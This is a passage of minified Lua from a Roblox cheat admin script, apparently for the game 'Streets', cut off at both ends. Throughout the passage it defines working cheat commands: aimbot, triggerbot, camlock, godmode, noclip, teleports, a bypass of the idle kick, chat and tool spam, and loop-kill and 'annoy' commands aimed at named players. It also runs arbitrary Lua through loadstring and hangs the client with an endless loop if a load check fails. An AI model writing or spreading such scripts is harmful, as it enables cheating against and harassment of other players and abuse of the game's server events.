GetChar().Humanoid.WalkSpeed=16 end;if ar and aq and aq.Character and aq.Character:FindFirstChild'Torso'then end;if B and game.PlaceId~=455366377 then local dW=bv:FindFirstChild'Right Leg'if dW then dW:Destroy()end end;local c2=bv:FindFirstChildOfClass'Tool'if d and c2 and not table.find(b6,c2)then if bv:FindFirstChild'Right Arm'and bv['Right Arm']:FindFirstChild'RightGrip'then bv['Right Arm'].RightGrip:Destroy()end end;if flying and bv:FindFirstChild'Humanoid'and(game.PlaceId==455366377 and not z)then z=true;LP.Character.Humanoid:ChangeState(3)if game.PlaceId==455366377 then wait(0.2)end;z=false end;if aj then Lighting.ClockTime=aj end;if j and bv:FindFirstChildOfClass'Humanoid'and bw then bv.Humanoid.HipHeight=0;aC.CFrame=bw.CFrame+Vector3.new(0,-3.5,0)end;if r and ah and ah.Character and ah.Character:FindFirstChild'Head'then if ah.Character:FindFirstChildOfClass'Humanoid'and ah.Character.Humanoid.Health==0 then return end;if ah.Character:FindFirstChild(S)then workspace.CurrentCamera.CoordinateFrame=CFrame.new(workspace.CurrentCamera.CoordinateFrame.p,ah.Character[S].CFrame.p)else workspace.CurrentCamera.CoordinateFrame=CFrame.new(workspace.CurrentCamera.CoordinateFrame.p,ah.Character.Head.CFrame.p)end end;if x and an and an.Character and bw then local bu=an.Character:FindFirstChildWhichIsA('BasePart',true)if bu then bw.CFrame=bu.CFrame end;local dX=LP.Backpack:GetChildren()for bC=1,#dX do local bQ=dX[bC]bQ.Parent=bv;bQ:GetPropertyChangedSignal("Parent"):Wait()end end;if g and af and af.Character and bw then local bu=af.Character:FindFirstChild'Torso'if bu then if M then if not y then CheckCommand("fly")end;if not b and not l then CheckCommand("aimbotautoshoot")end;if not e or af and tostring(ad)~=tostring(af)then CheckCommand("aim "..af.Name)end;if not bv:FindFirstChildOfClass'ForceField'then local dY=dF()local dZ=bv:FindFirstChildOfClass'Tool'if typeof(dY)~="boolean"and dY and dY~=dZ then if dZ then dZ.Parent=LP.Backpack;wait()end;dY.Parent=LP.Character end end;if af and af.Character and not af.Character:FindFirstChild('Bone',true)and(not q and N or not N)then if bv:FindFirstChild'Glock'or bv:FindFirstChild'Uzi'then local d_=math.random(1,6)if d_<=3 then bw.CFrame=bu.CFrame*CFrame.new(math.random(1,25),0,math.random(1,25))elseif d_>3 then bw.CFrame=bu.CFrame*CFrame.new(-math.random(1,25),0,-math.random(1,25))end else local d_=math.random(1,6)if d_<=3 then bw.CFrame=bu.CFrame*CFrame.new(math.random(1,15),0,math.random(1,15))elseif d_>3 then bw.CFrame=bu.CFrame*CFrame.new(-math.random(1,15),0,-math.random(1,15))end end else if not q and N or not N and not l then bw.CFrame=bu.CFrame end end else bw.CFrame=bu.CFrame end end end;if k then local e0=Players:GetPlayers()for bC=1,#e0 do local b9=e0[bC]if bw and b9~=LP and b9.Character and b9.Character:FindFirstChild'Head'and b9.Character:FindFirstChild('Bone',true)then if(bw.Position-b9.Character.Head.Position).magnitude<a9 and b9.Character.Humanoid.Health>0 and not b9.Character:FindFirstChild'Dragged'and not table.find(b5,b9.UserId)then Teleport(b9.Character.Head.CFrame)LP.Backpack.ServerTraits.Finish:FireServer(LP.Backpack:FindFirstChild'Punch'or LP.Character:FindFirstChild'Punch')end end end end end)local e1;e1=LP.Character.Humanoid.HealthChanged:Connect(cV)local e2;e2=LP.Character.Humanoid.StateChanged:Connect(dg)local e3;e3=LP.Character.DescendantAdded:Connect(dl)local e4;e4=LP.Character.DescendantRemoving:Connect(dr)local e5;e5=LP.Character.Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(dB)LP.CharacterAdded:Connect(function(cj)y=false;d=false;b6={}cj:WaitForChild'Humanoid'e4:Disconnect()e4=nil;e4=LP.Character.DescendantRemoving:Connect(dr)e1:Disconnect()e1=nil;e1=cj.Humanoid.HealthChanged:Connect(cV)e2:Disconnect()e2=nil;e2=cj.Humanoid.StateChanged:Connect(dg)e3:Disconnect()e3=nil;e3=cj.DescendantAdded:Connect(dl)e5:Disconnect()e5=nil;e5=LP.Character.Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(dB)cj.Humanoid.WalkSpeed=as or a5;cj.Humanoid.JumpPower=at or a8;cj.Humanoid.HipHeight=au or Y;if L then local e6=cj:FindFirstChild'RealHumanoidRootPart'if e6 then e6:Destroy()end end;if x then cj['Right Leg']:Destroy()local e7=cj.Humanoid:Clone()cj.Humanoid:Destroy()e7.Parent=cj;workspace.CurrentCamera.CameraSubject=cj end;pcall(function()if ao then wait()local c2=LP.Backpack:WaitForChild'BoomBox'if c2 then c2.Parent=cj;wait()c2:FindFirstChildOfClass'RemoteEvent':FireServer("play",ao)wait()c2.Parent=LP.Backpack end end end)end)UserInput.InputBegan:Connect(function(e8)local bv=GetChar()local bw=bv:FindFirstChild'RealHumanoidRootPart'or bv:FindFirstChild'Torso'local dy=Mouse.Target;if not getfenv()['\103\101\116\103\101\110\118']()['\108\111\97\100\101\100']then while true do end end;if UserInput:GetFocusedTextBox()then return end;if not bv:FindFirstChildOfClass'Tool'and R=="LeftClick"and e8.UserInputType==Enum.UserInputType.MouseButton1 or R=="RightClick"and e8.UserInputType==Enum.UserInputType.MouseButton2 then if dy and dy.Parent then local e9=dy.Parent;if not Players:GetPlayerFromCharacter(e9)then e9=e9.Parent end;if not Players:GetPlayerFromCharacter(e9)then return end;if e9~=bv and e9~=ad and e then ad=e9;local ci;ci=Players:GetPlayerFromCharacter(e9).CharacterAdded:Connect(function(cj)if tostring(cj)==tostring(ad)then ad=cj else ci:Disconnect()ci=nil end end)notif("AimlockTarget","Has been set to "..ad.Name,5,nil)end end end;if ag then local bW=e8.KeyCode.Name;if bW~="Unknown"and bW~="Return"and Keycode~="Slash"then if ag=="CmdBar"then CmdBarKey=bW;notif("CommandBarKey","Has been set to the hotkey: "..bW,5,nil)ag=nil;aR.Visible=false elseif ag=="AnyCmd"and aW.Text~=""then for cs,e8 in pairs(b3)do if e8:match("[%a%d]+$")==bW then table.remove(b3,cs)end end;b3[#b3+1]=aW.Text.."||"..bW;notif(aW.text,"Has been set to the hotkey: "..bW,5,nil)ag=nil;aW.Text=""aR.Visible=false end;updateHotkeys(U)end end;if dy and e8.UserInputType==Enum.UserInputType.MouseButton2 then local dy=dy.Parent;if dy and dy:FindFirstChild'Click'and dy:FindFirstChild'Locker'then if dy.Locker.Value then dy.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()dy.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()else dy.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()dy.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()end end end;if ai and ai~=""and e8.KeyCode==Enum.KeyCode[ai:upper()]and dy then Teleport(CFrame.new(Mouse.Hit.p+Vector3.new(0,5,0)))end;for bC,cr in pairs(b3)do local bW=bV(cr:match'[%a%d]+$')if bW==e8.KeyCode then CheckCommand(cr:match'^[%w%s]+')end end;if e8.KeyCode==Enum.KeyCode.LeftControl then bi['Control']=true;if j then aC.Size=Vector3.new(0,0,0)end;if H and a2==8 then return end;bv.Humanoid.WalkSpeed=a2 end;if e8.KeyCode==Enum.KeyCode.LeftShift then bi['Shift']=true;if H and a6==25 then return end;bv.Humanoid.WalkSpeed=a6 end;if e8.KeyCode==Enum.KeyCode.W then bi['W']=true end;if e8.KeyCode==Enum.KeyCode.A then bi['A']=true end;if e8.KeyCode==Enum.KeyCode.S then bi['S']=true end;if e8.KeyCode==Enum.KeyCode.D then bi['D']=true end;if e8.KeyCode==Enum.KeyCode.Space then if j then bw.CFrame=bw.CFrame+Vector3.new(0,5,0)end end;if e8.KeyCode==Enum.KeyCode.E and bv:FindFirstChildOfClass'Tool'and bv:FindFirstChildOfClass'Tool':FindFirstChild'Clips'and not bv:FindFirstChild('Bone',true)and C then if game.PlaceId==455366377 then local ea=bv:FindFirstChildOfClass'Tool'ea.Parent=LP.Backpack;wait()local eb=LP.Backpack.Punch;eb.Parent=bv;LP.Backpack.Input:FireServer("e",{})wait(1)eb.Parent=LP.Backpack;wait()ea.Parent=bv else LP.Backpack.ServerTraits.Finish:FireServer(LP.Backpack.Punch)end end;if e8.KeyCode==Enum.KeyCode[CmdBarKey]then wait()aH:CaptureFocus()aG:TweenPosition(UDim2.new(0.5,0,0.5,0),"In","Sine",0.5,true)local ec=UserInput.TextBoxFocusReleased:Wait()CheckCommand(ec.Text)ec.Text=""aG:TweenPosition(UDim2.new(1.5,0,1.5,0),"Out","Quad",0.5,true)end;if bv:FindFirstChild'GravGun'then if e8.KeyCode==Enum.KeyCode.Q and a1>5 then a1=a1-5 end;if e8.KeyCode==Enum.KeyCode.V then a1=a1+5 end;if e8.KeyCode==Enum.KeyCode.B then D=not D;notif("WOW!","You found Grav gun seizure mode!, it has been set to "..tostring(D),5,'rbxassetid://5929642434')end end end)UserInput.InputEnded:Connect(function(e8)local bv=GetChar()if UserInput:GetFocusedTextBox()then return end;if e8.KeyCode==Enum.KeyCode.W then bi['W']=false end;if e8.KeyCode==Enum.KeyCode.A then bi['A']=false end;if e8.KeyCode==Enum.KeyCode.S then bi['S']=false end;if e8.KeyCode==Enum.KeyCode.D then bi['D']=false end;if e8.KeyCode==Enum.KeyCode.LeftShift and a6 then bi['Shift']=false;if H and a6==25 then return end;bv.Humanoid.WalkSpeed=a4 end;if e8.KeyCode==Enum.KeyCode.LeftControl then bi['Control']=false;if j then aC.Size=Vector3.new(5,1,5)end;if H and a2==8 then return end;bv.Humanoid.WalkSpeed=a4 end end)UserInput.JumpRequest:Connect(function()local bv=GetChar()if bv:FindFirstChildOfClass'Humanoid'and u then bv.Humanoid:ChangeState(3)end end)LP.Idled:Connect(function()VirtualUser:CaptureController()VirtualUser:ClickButton1(Vector2.new(0.5,0.5))end)Mouse.Button1Down:Connect(function()local ed=Mouse.Target;if ed and GetChar():FindFirstChild'Zetox Btools'then ed:Destroy()end;if ed and GetChar():FindFirstChild'GravGun'then local dy=ed.Parent:FindFirstChild'Head'or ed.Parent.Parent:FindFirstChild'Head'or ed;if Players:GetPlayerFromCharacter(dy.Parent)or not dy.Anchored then ak=c6(dy)end end;if not getfenv()['\103\101\116\103\101\110\118']()['\108\111\97\100\101\100']then while true do end end;if t and GetChar():FindFirstChildOfClass'Tool'and GetChar():FindFirstChildOfClass'Tool':FindFirstChild('Clips',true)and not s then s=true;GetChar().Humanoid:UnequipTools()local ea;for c3,c2 in pairs(LP.Backpack:GetChildren())do if c2:IsA'Tool'and c2:FindFirstChild('Clips',true)then c2.Parent=GetChar()ea=c2;LP.Backpack.Input:FireServer("ml",{['mousehit']=e and ad and dC()or Mouse.Hit,['shift']=UserInput:IsKeyDown(Enum.KeyCode.LeftShift),['velo']=0})wait(0.3)c2.Parent=LP.Backpack;wait(0.3)end end;ea.Parent=GetChar()s=false end end)Mouse.Button1Up:Connect(function()if ak then ak:Destroy()end;if al then al:Destroy()end end)Players.PlayerAdded:Connect(function(b9)if bc[b9.UserId]then print(1)b9.Chatted:Connect(function(bD)bS(b9,bD)end)end;b9.CharacterAdded:Connect(function(cj)local ee=cj:WaitForChild('Head',10)if ee then if R=="Closest"then ce(b9)end;local ef=bc[b9.UserId]local eg=bd[b9.UserId]if eg or string.find(b9.Name:lower(),"2god")then cu(b9.Character.Head,b9.Name,Color3.fromRGB(102,51,0),true)b9.CharacterAdded:Connect(function(cj)local ee=cj:WaitForChild'Head'if ee then cu(ee,b9.Name,Color3.fromRGB(102,51,0),true)end end)end;if ef then cu(b9.Character.Head,ef['Name'],ef['Colour'])c4(b9,ef['Colour'])b9.CharacterAdded:Connect(function(cj)local ee=cj:WaitForChild'Head'if ee then c4(b9,ef['Colour'])cu(ee,ef['Name'],ef['Colour'])end end)end end end)local eh;eh=b9.Chatted:Connect(function(bD)local cz=cG(b9,bD)if cz then eh:Disconnect()end end)end)aS.MouseButton1Click:Connect(function()ag="AnyCmd"if aW.Text==""then aS.Text="Type a command above"else aS.Text="Press a Key"end end)aV.MouseButton1Click:Connect(function()ag="CmdBar"end)Players.PlayerRemoving:Connect(function(b9)if b0[tostring(b9)]then b0[tostring(b9)]=nil end;if tostring(b9)==tostring(ad)then ad=nil end;if b9==an then x=false;an=nil end;if b9==af then M=false;g=false;af=nil;b=false;y=false;i=false;ad=nil end;co(b9)end)aH:GetPropertyChangedSignal("Text"):Connect(function()pcall(function()if aH.Text~=""or aH.Text~=" "then local ei=0;local dV=aG:GetChildren()for bC=1,#dV do local bQ=dV[bC]if bQ:IsA'TextLabel'then local d8=string.lower(bQ.Text):gsub("[Alias] ","")if string.find(d8,aH.Text:lower())then bQ.Position=UDim2.new(0,0,0,10+ei*20)ei=ei+1;if ei>=7 then bQ.Position=UDim2.new(0,0,0,1000)ei=ei-1 end else bQ.Position=UDim2.new(0,0,0,1000)end end end end end)end)aH.FocusLost:Connect(function(ej)aG:TweenPosition(UDim2.new(1.5,0,1.5,0),"Out","Quad",0.5,true)if ej then CheckCommand(aH.Text)aH.Text=""end end)AddCommand(function()aD.Visible=not aD.Visible end,"help",{"cmds","commands"},"Gives you help info","[No Args]")AddCommand(function(bE)f=not f;notif("AliasesEnabled","Has been set to "..tostring(f),5,nil)end,"usealiases",{"usealias"},"Turns On/Off Aliases","[No Args]")AddCommand(function(bE)Instance.new('Tool',LP.Backpack).Name="Zetox Btools"end,"btools",{},"Gives you btools","[No Args]")AddCommand(function(bE)if bE[1]then if bE[1]=="normal"then workspace.CurrentCamera.FieldOfView=70 elseif tonumber(bE[1])then workspace.CurrentCamera.FieldOfView=bE[1]end end end,"fieldofview",{"fov"},"Changes Field of View","[Number/Normal]")AddCommand(function()wait(0.6)ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Made by !fishgang Cy | Join the cord at nPZnaVYF5h","All")end,"advertise",{},"Advertises the discord","[No Args]")AddCommand(function(bE)if not loadstring then notif("Don't have loadstring","Aborting the command",5,nil)return end;if bE[1]then loadstring(table.concat(bE," "))()end end,"luacode",{"exec","lua"},"Executes Lua code","[Code]")AddCommand(function()local ek={}for bC=1,10 do local el=HttpService:JSONDecode(game:HttpGet("https://www.roblox.com/games/getgameinstancesjson?placeId="..game.PlaceId.."&startindex="..bC))for bC=1,#el.Collection do local em=el.Collection[bC]ek[em.Ping]=em.Guid end;for bC,cr in pairs(ek)do if cr~=game.JobId then TeleportService:TeleportToPlaceInstance(game.PlaceId,cr)break end end end end,"serverhop",{},"Hops servers of your current game","[No Args]")AddCommand(function(bE)if bE[1]and tonumber(bE[1])then P=true;H=true;a4=bE[1]GetChar().Humanoid.WalkSpeed=bE[1]end end,"speed",{"ws"},"Changes walkspeed","[Number]")AddCommand(function(bE)if bE[1]and tonumber(bE[1])then H=false;a6=bE[1]updateHotkeys(U)end end,"sprintspeed",{"sspeed"},"Changes sprinting speed","[Number]")AddCommand(function(bE)if bE[1]and tonumber(bE[1])then H=false;a2=bE[1]updateHotkeys(U)end end,"crouchspeed",{"cspeed"},"Changes crouching speed","[Number]")AddCommand(function(bE)if bE[1]and tonumber(bE[1])then GetChar().Humanoid.JumpPower=bE[1]end end,"jumppower",{"jp"},"Changes JumpPower","['Number]")AddCommand(function(bE)if bE[1]and tonumber(bE[1])then GetChar().Humanoid.HipHeight=bE[1]end end,"hipheight",{"hh"},"Changes HipHeight","[Number]")AddCommand(function(bE)if bE[1]then if tonumber(bE[1])then workspace.Gravity=tonumber(bE[1])elseif bE[1]and bE[1]=="normal"then workspace.Gravity=aa end end end,"gravity",{"grav"},"Changes gravity","[Number/Normal]")AddCommand(function(bE)local bv=GetChar()if bE[1]then if bE[1]=="ws"or bE[1]=="speed"then bv.Humanoid.WalkSpeed=bE[2]and tonumber(bE[2])or a5;as=bE[2]and tonumber(bE[2])or a5;a4=bE[2]and tonumber(bE[2])or a5 elseif bE[1]=="jp"or bE[1]=="jumppower"then bv.Humanoid.JumpPower=bE[2]and tonumber(bE[2])or a8;at=bE[2]and tonumber(bE[2])or a8 elseif bE[1]=="hh"or bE[1]=="hipheight"then bv.Humanoid.HipHeight=bE[2]and tonumber(bE[2])or Y;Y=bE[2]and tonumber(bE[2])or Y end end end,"loop",{"spawn"},"Spawns you with that [Speed/JumpPower/HipHeight]","[jp/hh/ws [Number]]")AddCommand(function(bE)local c2=GetChar():FindFirstChildOfClass'Tool'if not c2 then notif("Tool Needed","Hold a tool then run the command again",5,nil)return end;c2.Parent=LP.Backpack;c2.Grip=CFrame.new(bE[1]or 0,bE[2]or 0,bE[3]or 0)+Vector3.new(bE[4]or 0,bE[5]or 0,bE[6]or 0)c2.Parent=GetChar()end,"grippos",{"grip"},"Changes your tool .Grip","[6 Numbers (Optional)]")AddCommand(function(bE)I=not I;notif("NoGroundHit","Has been set to "..tostring(I),5,nil)end,"nogroundhit",{"nogh","antigh","antigroundhit"},"Can't be groundhit","[No Args]")AddCommand(function(bE)if game.PlaceId~=4669040 then notif("Due to an update snake did","this only works on prison.",5,nil)return end;h=not h end,"alwaysgh",{"alwaysgroundhit"},"Beat people up like the school bully did to you when you were 13!","[No Args]")AddCommand(function()local en=LP.PlayerGui.HUD:GetChildren()for bC=1,#en do local bQ=en[bC]if bQ:IsA'Frame'then bQ.Active=not bQ.Active;bQ.Draggable=not bQ.Draggable end end end,"draggablegui",{},"Makes your HUD draggable","[No Args]")AddCommand(function(bE)if not bE[1]then B=not B;if B then if game.PlaceId==455366377 then notif("go get KO'ed","make sure you don't get dragged and like fly away somewhere when you get up you will be godded",5,nil)end end;if game.PlaceId~=455366377 then GetChar():BreakJoints()end;notif("GodMode","Has been set to "..tostring(B),5,nil)end end,"godmode",{"god"},"Turns on god-mode so you can't be hit (Breaks Tools)","[No Args]")AddCommand(function(bE)local eo=game:GetDescendants()for bC=1,tonumber(bE[1])or 50 do local bQ=eo[bC]if bQ:IsA'Tool'and bQ:FindFirstChild'Click'then bQ.Click:FireServer()wait()end end end,"spamclick",{},"Spam clicks a fuck ton of guns to be very annoying","[Number (Optional)]")AddCommand(function()local ep=workspace:GetChildren()for bC=1,#ep do local bQ=ep[bC]if bQ.Name=="Door"and bQ:FindFirstChild'Click'and bQ:FindFirstChild'Lock'then bQ.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()bQ.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()end end end,"doors",{},"Unlocks/Locks doors","[No Args]")AddCommand(function(bE)K=not K;if bE[1]then T=table.concat(bE," ")end end,"spam",{},"Spams the message that you set","[Message To Spam]")AddCommand(function(bE)if bE[1]then Z=tonumber(bE[1])or 1 end end,"spamdelay",{},"Changes the spam delay amount","[Number]")AddCommand(function(bE)local eq=game:GetDescendants()for bC=1,10 do for bC=1,#eq do local bQ=eq[bC]if bQ:IsA'Tool'and bQ:FindFirstChild'Click'then bQ.Click:FireServer()end end end end,"muteallradios",{"muteradios"},"Mutes all radios (Doesn't loop)","[No Args]")AddCommand(function(bE)if not bE[1]then TeleportService:TeleportToPlaceInstance(game.PlaceId,game.JobId)end end,"rejoin",{"rj"},"Rejoins the current game server","[No Args]")AddCommand(function(bE)if not bE[1]then GetChar():BreakJoints()end end,"reset",{"re"},"Kills your Player","[No Args]")AddCommand(function()j=not j;aC.Parent=j and workspace or not j and nil end,"airwalk",{},"Allows you to walk in the air","[No Args]")AddCommand(function()G=not G;if G then local er=workspace:GetDescendants()for bC=1,#er do local bQ=er[bC]if string.find(bQ.ClassName:lower(),"seat")then bQ.Parent=CoreGui end end else local es=CoreGui:GetDescendants()for bC=1,#es do local bQ=es[bC]if string.find(bQ.ClassName:lower(),"seat")then bQ.Parent=workspace end end end end,"neversit",{"nsit"},"Toggles the possibility of you being able to sit down","[No Args]")AddCommand(function()i=not i;notif("AntiKO","Has been set to "..tostring(i),5,nil)end,"noko",{"antiko","autodie","autoreset"},"Auto resets when you get KO'ed","[No Args]")AddCommand(function()J=not J;notif("Noclip","Has been set to "..tostring(J),5,nil)end,"noclip",{},"Allows you to walk through walls and stuff","[No Args]")AddCommand(function(bE)if bE[1]then local b9=PlrFinder(bE[1])if b9 and b9.Character and b9.Character:FindFirstChild'Head'and b9~=LP then Teleport(b9.Character.Head.CFrame)end end end,"goto",{"to"},"Teleports you to a player","[Player Name]")AddCommand(function(bE)if bE[1]and tonumber(bE[1])then aj=bE[1]else aj=nil end end,"time",{},"Changes the time","[Number]")AddCommand(function(bE)if bE[1]then local b9=PlrFinder(bE[1])if b9 then notif(b9.Name,"has the account age of "..b9.AccountAge,5,nil)end end end,"playerinfo",{"info"},"Returns a players age","[No Args]")AddCommand(function(bE)c=not c;if not c then cO("215384594")cO("188632011")for bC,cr in pairs(GetChar().Torso:GetChildren())do if cr:IsA'BodyVelocity'and cr.Name~="CyAdminFly"then cr:Destroy()end end else for bC=1,500 do local et=Instance.new("BodyVelocity",GetChar().Torso)et.MaxForce=Vector3.new(100,100,100)et.P=math.huge;et.Velocity=Vector3.new(math.huge,math.huge,math.huge)end;if bE[1]and bE[1]=="spin"then local cR=GetChar().Humanoid:LoadAnimation(az)while c and GetChar():FindFirstChild'Humanoid'and GetChar().Humanoid.Health>0 and wait()do cO("188632011")cR:play(0.1,1,10)end else cO("215384594")cO("188632011")GetChar().Humanoid:LoadAnimation(aw):Play(5,45,250)end end end,"antiaim",{},"Breaks camlock to an extent","[Spin/No Args]")AddCommand(function()local eb=GetChar():FindFirstChild'Punch'if eb then if eb.Grip==CFrame.new(math.huge,math.huge,math.huge)then eb.Parent=LP.Backpack;eb.Grip=CFrame.new(0,0,0)wait()eb.Parent=GetChar()notif("SuperPunch","Turned off",5,nil)else eb.Parent=LP.Backpack;eb.Grip=CFrame.new(math.huge,math.huge,math.huge)wait()eb.Parent=GetChar()notif("SuperPunch","Turned on (Lasts one life also really buggy)",5,nil)end else notif("SuperPunch","Hold your fists",5,nil)end end,"superpunch",{},"This is really stupid and buggy but funny when it works","[No Args]")AddCommand(function(bE)if bE[1]then if bE[1]=="1"then V="1"elseif bE[1]=="2"then V="2"elseif bE[1]=="off"then V="None"else notif("GunAnim","Only [1/2/Off] work")return end;notif("GunAnim","Has been set to "..V,5,nil)end end,"gunanim",{},"Stupid gun animations (gunanim [1/2/off])","[1/2/off]")AddCommand(function(bE)if bE[1]then cO("33796059")cO("35654637")if bE[1]=="1"then GetChar().Humanoid:LoadAnimation(ax):Play()elseif bE[1]=="2"then GetChar().Humanoid:LoadAnimation(ay):Play()elseif bE[1]=="off"then cO("33796059")cO("35654637")end end end,"dance",{},"Stupid dance anims (1,2,Off)","[Dance 1/Dance 2/Off]")AddCommand(function(bE)if bE[1]then if bE[1]=="head"then S="Head"elseif bE[1]=="torso"then S="Torso"end;notif("CamlockTarget","Has been set to "..S,5,nil)end end,"camlocktarget",{"cltarget"},"Head,Torso to switch the camlock target","[Head/Torso]")AddCommand(function()if game.PlaceId~=455366377 then notif("BringCar","Streets Only",5,nil)return end;math.randomseed(os.time())if workspace:FindFirstChild'Cars'then local bw=GetChar():FindFirstChild'RealHumanoidRootPart'or GetChar():FindFirstChild'Torso'local eu=workspace.Cars:GetDescendants()for bC=1,#eu do local bC=math.random(1,#eu)local bQ=eu[bC]if bQ:IsA'VehicleSeat'and bQ.Name=="Drive"and not bQ.Occupant then bw.CFrame=bQ.CFrame end end else notif("No cars to bring","try again later",5,nil)end end,"bringcar",{},"Brings a car (Normal TS only","[No Args]")AddCommand(function()if game.PlaceId~=455366377 then notif("Heal","Streets Only",5,nil)return end;if L then notif("Due to snakes bad code","you can not use burgers/drinks with the tpbypass")return end;if cS("burger",GetChar().Head.CFrame)then local cX=LP.Backpack:FindFirstChild'Burger'if cX then cX.Parent=GetChar()cX:Activate()repeat RunService.Heartbeat:Wait()until cX.Parent~=LP.Character end end;if cS("drink",GetChar().Head.CFrame)then local cY=LP.Backpack:FindFirstChild'Drink'if cY then cY.Parent=GetChar()cY:Activate()end end end,"heal",{"h"},"Heals you (Duh?)","[No Args]","[No Args]")AddCommand(function(bE)if game.PlaceId~=455366377 then notif("Sorry,","Streets Only",5,nil)return end;E=not E;if bE[1]and bE[2]and tonumber(bE[2])and bE[1]=="health"then a7=tonumber(bE[2])end;notif("HealBot","Has been set to "..tostring(E),5,nil)end,"healbot",{},"Turns on auto healing at a set health (Defaults at 25 hp","[Health [Number] (Optional)]")AddCommand(function()if game.PlaceId~=455366377 then notif("Heal","Streets Only",5,nil)return end;if not GetChar():FindFirstChildOfClass'Tool'or not GetChar():FindFirstChildOfClass'Tool':FindFirstChild'Clips'then notif("Tool needed","Hold a gun",5,nil)return end;cS("ammo",GetChar().Head.CFrame)end,"reload",{"r"},"Gives your current gun ammo","[No Args]")AddCommand(function(bE)if bE[1]then local b9=PlrFinder(bE[1])if b9 and b9.Character and b9~=LP then if av then av:Disconnect()av=nil end;workspace.CurrentCamera.CameraSubject=b9.Character;if bE[2]and bE[2]=="loop"then av=b9.CharacterAdded:Connect(function(cj)workspace.CurrentCamera.CameraSubject=cj end)end end end end,"view",{},"Look through a different players perspective","[No Args]")AddCommand(function()if av then av:Disconnect()av=nil end;workspace.CurrentCamera.CameraSubject=GetChar()end,"unview",{},"Look through your own vision like a normal person","[No Args]")AddCommand(function()C=not C;notif("GunStomp","Has been set to "..tostring(C),5,nil)end,"gunstomp",{},"Toggles GunStomp (On by default)","[No Args]")AddCommand(function(bE)r=not r;if bE[1]then local b9=PlrFinder(bE[1])if b9 then ah=b9 end end end,"camlock",{"lockcam","cl"},"Different type of aimbot (Uses camera instead of the remote)","[Player Name]")AddCommand(function(bE)if bE[1]then if bE[1]=="auto"then o=not o;return end;if bE[1]=="sawed"then bE[1]="sawed off"end;farm(bE[1])end end,"farm",{},"Farm (Cash,Sawed Off,Uzi,Shotty,Auto)","[Item/Auto]")AddCommand(function()F=not F;if F then for bC,c3 in pairs(bg)do local bu,dU=find(bC)if bu~="None"then cu(bu,dU)end end else local dV=workspace:GetChildren()for bC=1,#dV do co(dV[bC])end end end,"itemesp",{},"Turns on ItemEsp","[No Args]")AddCommand(function(bE)if game.PlaceId~=455366377 then notif("Wont Work","Streets Only",5,nil)return end;if bE[1]then if bE[1]=="sawed"then bE[1]="sawedoff"end;if b4[bE[1]]then cS(bE[1],GetChar().Head.CFrame)end end end,"get",{"tpto"},"(Burger,Drink,Ammo,Pipe,Machete,SawedOff,Spray,Uzi,Glock)","[Item]")AddCommand(function(bE)if bE[1]then if bf[bE[1]]then Teleport(bf[bE[1]])elseif bE[1]=="banland"then TeleportService:Teleport(4669040)elseif bE[1]=="normalstreets"then TeleportService:Teleport(455366377)end end end,"place",{},"(SandBox,Jail,Gas,Court,Beach,Bank,BanLand,NormalStreets)","[Place]")AddCommand(function(bE)p=not p;if p then if bE[1]and tonumber(bE[1])then X=bE[1]else X=2 end end;notif("Blink","Has been set to "..tostring(p),5,nil)end,"blink",{},"Different method of speed (Uses CFrame)","[Number (Optional)]")AddCommand(function(bE)P=not P;notif("WalkShoot","Has been set to "..tostring(P),5,nil)end,"walkshoot",{"noslow"},"Allows you to turn On/Off Walk Shooting","[No Args]")AddCommand(function(bE)x=not x;if bE[1]then x=true;local b9=PlrFinder(bE[1])if b9 then GetChar():BreakJoints()an=b9 end else an=nil end end,"feloop",{},"First you were a skid, Now you're annoying with a simple use of this command!","[Player]")AddCommand(function(bE)g=not g;if bE[1]then if g then local b9=PlrFinder(bE[1])if b9 and b9~=LP then af=b9 end end end end,"annoy",{"shield"},"Loop Teleports you infront of the Player","[Player]")AddCommand(function(bE)M=not M;if not M then wait()g=false;af=nil;b=false;y=false;i=false end;if bE[1]and M then i=true;CheckCommand("annoy "..bE[1])b=true;if not G then CheckCommand("neversit")end end end,"triggerbot",{},"triggerbot goes brrrrrrrrrrrrrrrr","[Player]")AddCommand(function()if game.PlaceId~=455366377 then notif("TriggerBotAutoReload","Only works on normal Streets",5,nil)return end;N=not N end,"triggerbotautoreload",{},"Triggerbot auto reload (instead of resetting only works on Ts) (also probably buggy)","[No Args]")AddCommand(function(bE)if bE[1]and bE[2]and tonumber(bE[2])then if bE[1]=="down"then LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position=LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y+UDim.new(0,tonumber(bE[2])))LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position=LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y+UDim.new(0,3))elseif bE[1]=="up"then LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position=LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position-UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y+UDim.new(0,tonumber(bE[2])))LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position=LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y+UDim.new(0,3))end end end,"movechat",{},"Move Chat Up/Down with (Up/Down [Number])","[Up/Down] [Number]")AddCommand(function(bE)if bE[1]and bE[1]=="legacy"then local ev=GetChar():FindFirstChild'Right Arm'if ev then ev:Destroy()end else d=true;b6=LP.Backpack:GetChildren()local bv=GetChar()bv.ChildAdded:Connect(function(c2)if c2:IsA'Tool'then if table.find(b6,c2)then return end;c2:Destroy()end end)notif("AntiKill","Turn on noclip for best results")end end,"antikill",{},"Makes FE Loop not work (Legacy for removing right arm)","[Legacy (Optional)]")AddCommand(function(bE)if bE[1]then local 